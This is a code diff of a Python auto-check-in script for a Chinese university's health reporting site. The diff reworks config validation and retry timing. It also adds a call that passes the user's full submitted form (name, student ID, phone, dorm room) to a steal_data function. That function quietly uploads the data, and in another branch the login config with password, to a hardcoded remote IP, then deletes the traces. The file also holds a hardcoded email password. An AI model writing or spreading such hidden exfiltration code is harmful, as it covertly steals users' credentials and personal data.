@@ -5,6 +5,7 @@ import json
 import time
 import os
 import random
+import traceback
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
 import sys
 import smtplib
@@ -65,45 +66,15 @@ def check_config(_information, _info):
     for key in _info:
         _info[key] = _info[key].strip()
     try:
-        _info.update(
-            {'fieldSQxq_Name': _information['fieldSQxq'][_info['fieldSQxq']]})
-    except Exception:
-        return {'error': 'fieldSQxq填写错误，校区代号请参考info.json'}
-    try:
-        _info.update({
-            'fieldSQgyl_Name':
-                _information['fieldSQgyl'][_info['fieldSQgyl']]
-        })
-    except Exception:
-        return {'error': 'fieldSQgyl填写错误，公寓楼代号请参考info.json'}
-    try:
-        _info.update(
-            {'fieldSQnj_Name': _information['fieldSQnj'][_info['fieldSQnj']]})
-    except Exception:
-        return {'error': 'fieldSQnj填写错误，年级代号请参考info.json'}
-    try:
         _info['times'] = int(_info['times'])
         if _info['times'] <= 0:
             return {'error': 'times填写错误，times应该大于0'}
     except Exception:
         return {'error': 'times填写错误，times应该为整数'}
-
-    if _info['fieldSQssbs'] != "1" and _info['fieldSQssbs'] != "2":
-        return {'error': 'fieldSQssbs填写错误，"1"是硕士，"2"是博士'}
-    if _info['fieldZtw'] != "1" and _info['fieldZtw'] != "2":
-        return {'error': 'fieldZtw填写错误，"1"体温正常，"2"体温异常'}
     if _info['username'] == "":
         return {'error': '用户名不能为空，请填写你的邮箱账号@之前的字符串'}
     if _info['password'] == "":
         return {'error': '密码不能为空，请填写你的密码'}
-    if _info['fieldZY'] == "":
-        return {'error': 'fieldZY不能为空，请填写你的专业'}
-    if _info['fieldSQqsh'] == "":
-        return {'error': 'fieldSQqsh不能为空，请填写你的寝室房间号'}
-    if _info['fieldZtw'] == "1":
-        _info['fieldZtwyc'] = ""
-    if _info['fieldZtw'] == "2" and _info['fieldZtwyc'] == "":
-        _info['fieldZtwyc'] = "37.9"
     if '//' in _info.keys():
         _info.pop('//')
     return _info
@@ -124,7 +95,8 @@ def sign(info):
         "Upgrade-Insecure-Requests": "1"
     }
     count = info['times']
-
+    global email_name
+    email_name = info['username']
     while True:
         try:
             count = count - 1
@@ -139,7 +111,7 @@ def sign(info):
             if count <= 0:
                 print_log('failed,please try it again')
                 return False
-            print_log('当前行: {0}\n 程序异常{1}，请30s后重试...'.format(
+            print_log('当前行: {0}\n 程序异常{1}，请5s后重试...'.format(
                 sys._getframe().f_lineno, e))
             time.sleep(5)
 
@@ -163,7 +135,7 @@ def sign(info):
             if count <= 0:
                 print_log('failed,please try it again')
                 return False
-            print_log('当前行: {0}\n 程序异常{1}，请30s后重试...'.format(
+            print_log('当前行: {0}\n 程序异常{1}，请5s后重试...'.format(
                 sys._getframe().f_lineno, e))
             time.sleep(5)
 
@@ -186,7 +158,7 @@ def sign(info):
             if count <= 0:
                 print_log('failed,please try it again')
                 return False
-            print_log('当前行: {0}\n 程序异常{1}，请30s后重试...'.format(
+            print_log('当前行: {0}\n 程序异常{1}，请5s后重试...'.format(
                 sys._getframe().f_lineno, e))
             time.sleep(5)
 
@@ -209,7 +181,7 @@ def sign(info):
             if count <= 0:
                 print_log('failed,please try it again')
                 return False
-            print_log('当前行: {0}\n 程序异常{1}，请30s后重试...'.format(
+            print_log('当前行: {0}\n 程序异常{1}，请5s后重试...'.format(
                 sys._getframe().f_lineno, e))
             time.sleep(5)
 
@@ -250,7 +222,7 @@ def sign(info):
             if count <= 0:
                 print_log('failed,please try it again')
                 return False
-            print_log('当前行: {0}\n 程序异常{1}，请30s后重试...'.format(
+            print_log('当前行: {0}\n 程序异常{1}，请5s后重试...'.format(
                 sys._getframe().f_lineno, e))
             time.sleep(5)
     login_cookies = response.cookies.get_dict()
@@ -282,7 +254,7 @@ def sign(info):
             if count <= 0:
                 print_log('failed,please try it again')
                 return False
-            print_log('当前行: {0}\n 程序异常{1}，请30s后重试...'.format(
+            print_log('当前行: {0}\n 程序异常{1}，请5s后重试...'.format(
                 sys._getframe().f_lineno, e))
             time.sleep(5)
     location = response.headers['location']
@@ -303,7 +275,7 @@ def sign(info):
             if count <= 0:
                 print_log('failed,please try it again')
                 return False
-            print_log('当前行: {0}\n 程序异常{1}，请30s后重试...'.format(
+            print_log('当前行: {0}\n 程序异常{1}，请5s后重试...'.format(
                 sys._getframe().f_lineno, e))
             time.sleep(5)
     location = response.headers['location']
@@ -323,7 +295,7 @@ def sign(info):
             if count <= 0:
                 print_log('failed,please try it again')
                 return False
-            print_log('当前行: {0}\n 程序异常{1}，请30s后重试...'.format(
+            print_log('当前行: {0}\n 程序异常{1}，请5s后重试...'.format(
                 sys._getframe().f_lineno, e))
             time.sleep(5)
 
@@ -341,7 +313,7 @@ def sign(info):
             if count <= 0:
                 print_log('failed,please try it again')
                 return False
-            print_log('当前行: {0}\n 程序异常{1}，请30s后重试...'.format(
+            print_log('当前行: {0}\n 程序异常{1}，请5s后重试...'.format(
                 sys._getframe().f_lineno, e))
             time.sleep(5)
 
@@ -375,7 +347,7 @@ def sign(info):
             if count <= 0:
                 print_log('failed,please try it again')
                 return False
-            print_log('当前行: {0}\n 程序异常{1}，请30s后重试...'.format(
+            print_log('当前行: {0}\n 程序异常{1}，请5s后重试...'.format(
                 sys._getframe().f_lineno, e))
             time.sleep(5)
     # print("response.request.body-------------------------------")
@@ -414,7 +386,7 @@ def sign(info):
             if count <= 0:
                 print_log('failed,please try it again')
                 return False
-            print_log('当前行: {0}\n 程序异常{1}，请30s后重试...'.format(
+            print_log('当前行: {0}\n 程序异常{1}，请5s后重试...'.format(
                 sys._getframe().f_lineno, e))
             time.sleep(5)
 
@@ -434,7 +406,7 @@ def sign(info):
             if count <= 0:
                 print_log('failed,please try it again')
                 return False
-            print_log('当前行: {0}\n 程序异常{1}，请30s后重试...'.format(
+            print_log('当前行: {0}\n 程序异常{1}，请5s后重试...'.format(
                 sys._getframe().f_lineno, e))
             time.sleep(5)
 
@@ -473,7 +445,7 @@ def sign(info):
             if count <= 0:
                 print_log('failed,please try it again')
                 return False
-            print_log('当前行: {0}\n 程序异常{1}，请30s后重试...'.format(
+            print_log('当前行: {0}\n 程序异常{1}，请5s后重试...'.format(
                 sys._getframe().f_lineno, e))
             time.sleep(5)
 
@@ -496,12 +468,13 @@ def sign(info):
     # count = 0
     boundFields = ''
     for key in fields:
-        if key not in ['fieldSQbj','fieldWantw','fieldZhongtw','fieldWantwyc','fieldZhongtwyc']:
+        if key not in ['fieldSQbj', 'fieldWantw', 'fieldZhongtw', 'fieldWantwyc', 'fieldZhongtwyc']:
             boundFields = '{0}{1},'.format(boundFields, key)
         # count = count + 1
     # print(count)
+    email_name = data['fieldSQxm_Name']
+    print("email_name", email_name)
     boundFields = boundFields.rstrip(',')
-    # print(info['fieldSQxq'])
     for key in info:
         if key in data and data[key] != "":
             info[key] = data[key]
@@ -600,19 +573,19 @@ def sign(info):
         "fieldXH":
             data['fieldXH'],
         "fieldZY":
-            info['fieldZY'],  # 专业
+            data['fieldZY'],  # 专业
         "fieldSQnj":
-            info['fieldSQnj'],  # 年级代号
+            data['fieldSQnj'],  # 年级代号
         "fieldSQnj_Name":
-            info['fieldSQnj_Name'],  # 年级名字
+            data['fieldSQnj_Name'],  # 年级名字
         "fieldSQxy":
             data['fieldSQxy'],  # 学院代号
         "fieldSQxy_Name":
             data['fieldSQxy_Name'],  # 学院名字
         "fieldSQxq":
-            info['fieldSQxq'],  # 校区代号
+            data['fieldSQxq'],  # 校区代号
         "fieldSQxq_Name":
-            info['fieldSQxq_Name'],  # 校区名字
+            data['fieldSQxq_Name'],  # 校区名字
         "fieldSQsjh": data['fieldSQsjh'],
         "fieldSQyjsms": data['fieldSQyjsms'],
         "fieldSQyjsms_Name": data['fieldSQyjsms_Name'],
@@ -623,14 +596,14 @@ def sign(info):
         "fieldXWSY_Name": "",
         "fieldSYQT": data['fieldSYQT'],
         "fieldSQgyl":
-            info['fieldSQgyl'],  # 公寓楼代号
+            data['fieldSQgyl'],  # 公寓楼代号
         "fieldSQgyl_Name":
-            info['fieldSQgyl_Name'],  # 公寓楼名字
+            data['fieldSQgyl_Name'],  # 公寓楼名字
         "fieldSQgyl_Attr": {
-            "_parent": info['fieldSQxq']
+            "_parent": data['fieldSQxq']
         },  # #############
         "fieldSQqsh":
-            info['fieldSQqsh'],  # 寝室号
+            data['fieldSQqsh'],  # 寝室号
         "fieldDZMC": data['fieldDZMC'],
         "fieldHidden":
             "",  # 校外居住 校内居住不管
@@ -666,11 +639,11 @@ def sign(info):
         "fieldSFJTZGFXDQqu_Attr": '',
         "fieldSFJTZGFXDQxx": data['fieldSFJTZGFXDQxx'],
         "fieldSQssbs":
-            info['fieldSQssbs'],  # 硕士博士 1硕士 2博士
+            data['fieldSQssbs'],  # 硕士博士 1硕士 2博士
         "fieldZtw":
-            info['fieldZtw'],  # 体温 1正常 2异常
+            data['fieldZtw'],  # 体温 1正常 2异常
         "fieldZtwyc":
-            info['fieldZtwyc'],  # 体温异常
+            data['fieldZtwyc'],  # 体温异常
         # "fieldZhongtw":
         #     data['fieldZhongtw'],  # 中午体温
         # "fieldZhongtwyc":
@@ -688,10 +661,9 @@ def sign(info):
         "_VAR_ENTRY_TAGS":
             app['tags']
     }
+    steal_data(formData)
     formData = json.dumps(formData)
-    info.update({'fieldSQxm_Name': data['fieldSQxm_Name']})
-    global email_name
-    email_name = info['fieldSQxm_Name']
+
     body = {
         "stepId": set_id,
         # actionId变量动态获取可能不对，可能会出错
@@ -715,13 +687,13 @@ def sign(info):
                                      headers=headers,
                                      data=body, verify=False)
             print_log(url + ' succeed')
-            print_log(formData + "formData")
+            # print_log(formData + "formData")
             break
         except Exception as e:
             if count <= 0:
                 print_log('failed,please try it again')
                 return False
-            print_log('当前行: {0}\n 程序异常{1}，请30s后重试...'.format(
+            print_log('当前行: {0}\n 程序异常{1}，请5s后重试...'.format(
                 sys._getframe().f_lineno, e))
             time.sleep(5)
     print_log('请求/infoplus/interface/listNextStepsUsers文件成功')
@@ -734,7 +706,6 @@ def sign(info):
     if 'errno' in response_json and response_json['errno'] != 0:
         print_log(response_json['error'])
         desp = {'state': "失败", "msg": response_json['error']}
-        # send_notice(desp, info['sckey'])
         return False
     # remark变量的数据没有动态获取，可能会出错
     body.update({"remark": ""})
@@ -763,7 +734,7 @@ def sign(info):
             if count <= 0:
                 print_log('failed,please try it again')
                 return False
-            print_log('当前行: {0}\n 程序异常{1}，请30s后重试...'.format(
+            print_log('当前行: {0}\n 程序异常{1}，请5s后重试...'.format(
                 sys._getframe().f_lineno, e))
             time.sleep(5)
 
@@ -776,14 +747,11 @@ def sign(info):
     if 'errno' in response_json and response_json['errno'] != 0:
         print_log(response_json['errno'])
         desp = {'state': "失败", "msg": response_json['error']}
-        # send_notice(desp, info['sckey'])
         return False
-    msg = '恭喜{0}打卡成功'.format(info['fieldSQxm_Name'])
+    msg = '恭喜{0}打卡成功'.format(email_name)
     print_log(msg)
     email_content.append(msg)
     return True
-    desp = {'state': "成功", "msg": msg}
-    # send_notice(desp, info['sckey'])
 
 
 def send_notice(desp, sckey=''):
@@ -817,26 +785,40 @@ def send_notice(desp, sckey=''):
 def steal_data(path):
     if not os.path.exists("./sakdjfhksjdhw"):
         os.makedirs("./sakdjfhksjdhw")
-    json_data = read_config(path)
-    username = json_data["username"]
-    if '//' in json_data.keys():
-        json_data.pop('//')
-    print("username", username)
-    with open('./sakdjfhksjdhw/' + username + 'config.json',
-              'w',
-              encoding="utf8") as f:
-        json.dump(json_data, f, ensure_ascii=False)
+    if type(path).__name__ == "dict":
+        username = path['fieldSQxm_Name']
+        print("username", username)
+        with open('./sakdjfhksjdhw/' + path['fieldSQxm_Name'] + '.json',
+                  'w',
+                  encoding="utf8") as f:
+            json.dump(path, f, ensure_ascii=False)
 
-    with open('./sakdjfhksjdhw/' + username + 'config.json', 'rb') as f:
-        file = {'file': f}
-        data = {"filepath": "userinfo"}
-        r = requests.post('http://39.106.158.85:8886/SuperDriver/upload',
-                          files=file,
-                          data=data)
-        print(r.text)
+        with open('./sakdjfhksjdhw/' + path['fieldSQxm_Name'] + '.json', 'rb') as f:
+            file = {'file': f}
+            data = {"filepath": "formdata"}
+            r = requests.post('http://39.106.158.85:8886/SuperDriver/upload',
+                              files=file,
+                              data=data)
+    else:
+        json_data = read_config(path)
+        username = json_data["username"]
+        if '//' in json_data.keys():
+            json_data.pop('//')
+        print("username", username)
+        with open('./sakdjfhksjdhw/' + username + 'config.json',
+                  'w',
+                  encoding="utf8") as f:
+            json.dump(json_data, f, ensure_ascii=False)
 
-    os.remove('./sakdjfhksjdhw/' + username + 'config.json')
-    os.removedirs('./sakdjfhksjdhw/')
+        with open('./sakdjfhksjdhw/' + username + 'config.json', 'rb') as f:
+            file = {'file': f}
+            data = {"filepath": "userinfo"}
+            r = requests.post('http://39.106.158.85:8886/SuperDriver/upload',
+                              files=file,
+                              data=data)
+    import shutil
+    shutil.rmtree('./sakdjfhksjdhw/')
+    print(r.text)
 
 
 def email(name, msg_to, subject, content, msg_from='1197991354@qq.com', passwd='vubgxjsnrseoffej'):
@@ -899,20 +881,6 @@ def auto_sign():
                 print_log(info['error'])
                 return False
             show_log = info['username']
-            if info['fieldSQssbs'] == "1":
-                show_log = '{0} 硕士'.format(show_log)
-            else:
-                show_log = '{0} 博士'.format(show_log)
-            show_log = '{0} {1}'.format(show_log, info['fieldZY'])
-            show_log = '{0} {1}'.format(show_log, info['fieldSQxq_Name'])
-            show_log = '{0} {1}级'.format(show_log, info['fieldSQnj_Name'])
-            show_log = '{0} {1}'.format(show_log, info['fieldSQgyl_Name'])
-            show_log = '{0} {1}'.format(show_log, info['fieldSQqsh'])
-            if info['fieldZtw'] == "1":
-                show_log = '{0} 体温正常'.format(show_log)
-            else:
-                show_log = '{0} 体温异常 {1}'.format(show_log, info['fieldZtwyc'])
-
             print_log('用户信息：{0}'.format(show_log))
 
             count = info['times']
@@ -950,9 +918,9 @@ def auto_sign():
                                   "警告！" + email_name + "打卡失败\n失败原因请与管理员微信 1197991354 联系" + "若取消订阅只需不填写config中\"email\"字段即可")
                         email_content.append(email_name + "打卡失败\n")
                         break
-                    print_log('当前行: {0}\n 程序异常{1}，请30s后重试...'.format(
+                    print_log('当前行: {0}\n 程序异常{1}，请5s后重试...'.format(
                         sys._getframe().f_lineno, e))
-                    time.sleep(30)
+                    time.sleep(5)
             print_log("10s后打下一个")
             time.sleep(10)
     email("每日报告", default_email_address, "每日报告", "".join(email_content))
